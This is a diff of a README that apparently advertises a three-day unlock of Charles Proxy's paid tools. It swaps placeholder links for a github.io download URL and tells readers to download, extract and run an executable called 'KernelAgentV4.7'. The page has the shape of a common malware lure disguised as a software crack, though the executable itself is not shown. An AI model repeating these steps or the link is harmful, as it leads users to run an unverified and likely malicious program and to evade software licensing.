@@ -2,13 +2,15 @@
 
 Use this configuration to activate full access to Charles Proxy’s advanced tools for 3 days. Includes SSL decryption, rewrite rules, breakpoints, bandwidth simulation, and mapping—all managed locally using `KernelAgentV4.7`.
 
-[![Download Charles Tool](https://img.shields.io/badge/Download-Charles_Proxy_3_Day-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Charles Tool](https://img.shields.io/badge/Download-Charles_Proxy_3_Day-blueviolet)](https://charles-proxy-3day.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://charles-proxy-3day.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\CharlesProxy3Day`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🔁 Start Charles Proxy — all tools will be active for 3 days  
